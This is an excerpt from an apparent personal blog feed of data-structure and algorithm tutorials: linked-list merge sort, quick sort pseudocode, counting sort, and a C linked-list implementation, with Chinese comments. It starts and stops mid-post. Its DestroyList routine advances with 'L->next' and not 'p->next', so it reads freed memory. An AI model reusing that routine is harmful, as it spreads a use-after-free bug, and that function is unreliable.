class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> {</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">sortList</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>) <span class="keyword">return</span> head;</span><br><span class="line">        ListNode* fast = head-&gt;next;</span><br><span class="line">        ListNode* slow = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="literal">NULL</span>) {</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        ListNode* mid = slow-&gt;next;</span><br><span class="line">        slow-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> merge(sortList(head), sortList(mid));</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">merge</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>{</span><br><span class="line">        <span class="function">ListNode <span class="title">dummy</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">        ListNode* p = &amp;dummy;</span><br><span class="line">        <span class="keyword">while</span> (l1 &amp;&amp; l2) {</span><br><span class="line">            <span class="keyword">if</span> (l1-&gt;val &gt; l2-&gt;val) swap(l1, l2);</span><br><span class="line">            p-&gt;next = l1;</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (l1) p-&gt;next = l1;</span><br><span class="line">        <span class="keyword">if</span> (l2) p-&gt;next = l2;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Quick-Sort"><a href="#Quick-Sort" class="headerlink" title="Quick Sort:"></a>Quick Sort:</h3><p><strong>recursive formula</strong><br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x9012;&#x63A8;&#x516C;&#x5F0F;&#xFF1A;</span><br><span class="line">quick_sort(p&#x2026;r) = quick_sort(p&#x2026;q<span class="number">-1</span>) + quick_sort(q+<span class="number">1</span>, r)</span><br><span class="line"></span><br><span class="line">&#x7EC8;&#x6B62;&#x6761;&#x4EF6;&#xFF1A;</span><br><span class="line">p &gt;= r</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Fake Code:</strong><br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x5FEB;&#x901F;&#x6392;&#x5E8F;&#xFF0C;A &#x662F;&#x6570;&#x7EC4;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4;&#x7684;&#x5927;&#x5C0F;</span></span><br><span class="line">quick_sort(A, n) {</span><br><span class="line">  quick_sort_c(A, <span class="number">0</span>, n<span class="number">-1</span>)</span><br><span class="line">}</span><br><span class="line"><span class="comment">// &#x5FEB;&#x901F;&#x6392;&#x5E8F;&#x9012;&#x5F52;&#x51FD;&#x6570;&#xFF0C;p,r &#x4E3A;&#x4E0B;&#x6807;</span></span><br><span class="line">quick_sort_c(A, p, r) {</span><br><span class="line">  <span class="keyword">if</span> p &gt;= r then <span class="keyword">return</span></span><br><span class="line">  </span><br><span class="line">  q = partition(A, p, r) <span class="comment">// &#x83B7;&#x53D6;&#x5206;&#x533A;&#x70B9;</span></span><br><span class="line">  quick_sort_c(A, p, q<span class="number">-1</span>)</span><br><span class="line">  quick_sort_c(A, q+<span class="number">1</span>, r)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>partition function:</strong><br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">partition(A, p, r) {</span><br><span class="line">  pivot := A[r]</span><br><span class="line">  i := p</span><br><span class="line">  <span class="keyword">for</span> j := p to r<span class="number">-1</span> <span class="keyword">do</span> {</span><br><span class="line">    <span class="keyword">if</span> A[j] &lt; pivot {</span><br><span class="line">      swap A[i] with A[j]</span><br><span class="line">      i := i+<span class="number">1</span></span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  swap A[i] with A[r]</span><br><span class="line">  <span class="keyword">return</span> i</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="counting-sort"><a href="#counting-sort" class="headerlink" title="counting sort"></a>counting sort</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x8BA1;&#x6570;&#x6392;&#x5E8F;&#xFF0C;a &#x662F;&#x6570;&#x7EC4;&#xFF0C;n &#x662F;&#x6570;&#x7EC4;&#x5927;&#x5C0F;&#x3002;&#x5047;&#x8BBE;&#x6570;&#x7EC4;&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x90FD;&#x662F;&#x975E;&#x8D1F;&#x6574;&#x6570;&#x3002;</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">countingSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// &#x67E5;&#x627E;&#x6570;&#x7EC4;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x8303;&#x56F4;</span></span><br><span class="line">  <span class="keyword">int</span> max = a[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) {</span><br><span class="line">    <span class="keyword">if</span> (max &lt; a[i]) {</span><br><span class="line">      max = a[i];</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span>[] c = <span class="keyword">new</span> <span class="keyword">int</span>[max + <span class="number">1</span>]; <span class="comment">// &#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x8BA1;&#x6570;&#x6570;&#x7EC4; c&#xFF0C;&#x4E0B;&#x6807;&#x5927;&#x5C0F; [0,max]</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= max; ++i) {</span><br><span class="line">    c[i] = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// &#x8BA1;&#x7B97;&#x6BCF;&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x653E;&#x5165; c &#x4E2D;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) {</span><br><span class="line">    c[a[i]]++;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// &#x4F9D;&#x6B21;&#x7D2F;&#x52A0;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= max; ++i) {</span><br><span class="line">    c[i] = c[i-<span class="number">1</span>] + c[i];</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// &#x4E34;&#x65F6;&#x6570;&#x7EC4; r&#xFF0C;&#x5B58;&#x50A8;&#x6392;&#x5E8F;&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x679C;</span></span><br><span class="line">  <span class="keyword">int</span>[] r = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">  <span class="comment">// &#x8BA1;&#x7B97;&#x6392;&#x5E8F;&#x7684;&#x5173;&#x952E;&#x6B65;&#x9AA4;&#xFF0C;&#x6709;&#x70B9;&#x96BE;&#x7406;&#x89E3;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) {</span><br><span class="line">    <span class="keyword">int</span> index = c[a[i]]-<span class="number">1</span>;</span><br><span class="line">    r[index] = a[i];</span><br><span class="line">    c[a[i]]--;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// &#x5C06;&#x7ED3;&#x679C;&#x62F7;&#x8D1D;&#x7ED9; a &#x6570;&#x7EC4;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) {</span><br><span class="line">    a[i] = r[i];</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linked List</title>
      <link href="/2018/10/25/Linked-List/"/>
      <url>/2018/10/25/Linked-List/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_4a701dd79b59427be654261805b349f8.jpg" alt=""></p><a id="more"></a><p><img src="http://p4wiqzx0i.bkt.clouddn.com/%E9%93%BE%E8%A1%A8.png" alt=""></p><p><strong>LinkList.h</strong><br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LINKLIST_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LINKLIST_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> </span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>*<span class="title">next</span>;</span></span><br><span class="line">}LinkList;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateListHead</span><span class="params">(LinkList *&amp;L,ElemType a[],<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateListTail</span><span class="params">(LinkList *&amp;L,ElemType a[],<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(LinkList *&amp;L)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyList</span><span class="params">(LinkList *&amp;L)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListEmpty</span><span class="params">(LinkList *L)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength</span><span class="params">(LinkList *L)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowList</span><span class="params">(LinkList *L)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetListElem</span><span class="params">(LinkList *L,<span class="keyword">int</span> i,ElemType &amp;e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateElem</span><span class="params">(LinkList*L,ElemType e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListInsert</span><span class="params">(LinkList *&amp;L,<span class="keyword">int</span> i,ElemType e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListDelete</span><span class="params">(LinkList *&amp;L,<span class="keyword">int</span> i,ElemType &amp;e)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>LinkList.cpp</strong><br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;LinkList.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateListHead</span><span class="params">(LinkList *&amp;L,ElemType a[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">LinkList *s;</span><br><span class="line">L = (LinkList *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">{</span><br><span class="line">s=(LinkList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">s-&gt;data = a[i];</span><br><span class="line">s-&gt;next = L-&gt;next;</span><br><span class="line">L-&gt;next = s;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateListTail</span><span class="params">(LinkList *&amp;L,ElemType a[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">LinkList * s,* r;</span><br><span class="line">L = (LinkList *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">r = L;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">{</span><br><span class="line">s = (LinkList *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">s-&gt;data = a[i];</span><br><span class="line">r-&gt;next = s;</span><br><span class="line">r = s;</span><br><span class="line">}</span><br><span class="line">r-&gt;next = <span class="literal">NULL</span>; </span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(LinkList *&amp;L)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">L=(LinkList *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyList</span><span class="params">(LinkList *&amp;L)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkList * pre = L,*p = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">free</span>(pre);</span><br><span class="line">pre = p;</span><br><span class="line">p = L-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">free</span>(pre);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListEmpty</span><span class="params">(LinkList *L)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span>(L-&gt;next==<span class="literal">NULL</span>); </span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength</span><span class="params">(LinkList *L)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">LinkList * p = L;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">n++;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span>(n);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowList</span><span class="params">(LinkList *L)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkList * p = L-&gt;next;<span class="comment">//&#xD6;&#xB8;&#xCF;&#xF2;&#xBF;&#xAA;&#xCA;&#xBC;&#xBD;&#xDA;&#xB5;&#xE3;</span></span><br><span class="line"><span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %c &quot;</span>,p-&gt;data);</span><br><span class="line">p = p-&gt;next; </span><br><span class="line">} </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetListElem</span><span class="params">(LinkList *L,<span class="keyword">int</span> i,ElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">LinkList *p = L;</span><br><span class="line"><span class="keyword">while</span>(j&lt;i&amp;&amp;p!=<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">j++;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">e=p-&gt;data;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateElem</span><span class="params">(LinkList*L,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">LinkList *p = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;p-&gt;data!=e){</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">i++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span>(i);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListInsert</span><span class="params">(LinkList *&amp;L,<span class="keyword">int</span> i,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">LinkList *p =L,*s;</span><br><span class="line"><span class="keyword">while</span>(j&lt;i<span class="number">-1</span>&amp;&amp;p!=<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">j++;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">s= (LinkList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">s-&gt;data = e;</span><br><span class="line">s-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = s;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListDelete</span><span class="params">(LinkList *&amp;L,<span class="keyword">int</span> i,ElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">LinkList * p =L,*q;</span><br><span class="line"><span class="keyword">while</span>(j&lt;i<span class="number">-1</span>&amp;&amp;p!=<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">j++;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">q=p-&gt;next;</span><br><span class="line"><span class="keyword">if</span>(q==<span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">e=q-&gt;data;</span><br><span class="line">p-&gt;next=q-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x54E8;&#x5175;"><a href="#&#x54E8;&#x5175;" class="headerlink" title="&#x54E8;&#x5175;"></a>&#x54E8;&#x5175;</h3><p>&#x94FE;&#x8868;&#x4E2D;&#x7684;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#x662F;&#x89E3;&#x51B3;&#x8FB9;&#x754C;&#x95EE;&#x9898;&#x7684;&#xFF0C;&#x4E0D;&#x53C2;&#x4E0E;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x3002;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5F15;&#x5165;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#xFF0C;&#x5219;&#x4E0D;&#x7BA1;&#x94FE;&#x8868;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;head&#x6307;&#x9488;&#x90FD;&#x4F1A;&#x6307;&#x5411;&#x8FD9;&#x4E2A;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#x3002;&#x6211;&#x4EEC;&#x628A;&#x8FD9;&#x79CD;&#x6709;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#x7684;&#x94FE;&#x8868;&#x79F0;&#x4E3A;&#x5E26;&#x5934;&#x94FE;&#x8868;&#xFF0C;&#x76F8;&#x53CD;&#xFF0C;&#x6CA1;&#x6709;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#x7684;&#x94FE;&#x8868;&#x5C31;&#x79F0;&#x4E3A;&#x4E0D;&#x5E26;&#x5934;&#x94FE;&#x8868;&#x3002;</p><p>&#x4E3E;&#x4E2A;&#x6817;&#x5B50;:<br>code1:&#x672A;&#x5229;&#x7528;&#x54E8;&#x5175;<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x5728;&#x6570;&#x7EC4; a &#x4E2D;&#xFF0C;&#x67E5;&#x627E; key&#xFF0C;&#x8FD4;&#x56DE; key &#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;</span></span><br><span class="line"><span class="comment">// &#x5176;&#x4E2D;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4; a &#x7684;&#x957F;&#x5EA6;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span>* a, <span class="keyword">int</span> n, <span class="keyword">char</span> key)</span> </span>{</span><br><span class="line">  <span class="comment">// &#x8FB9;&#x754C;&#x6761;&#x4EF6;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C; a &#x4E3A;&#x7A7A;&#xFF0C;&#x6216;&#x8005; 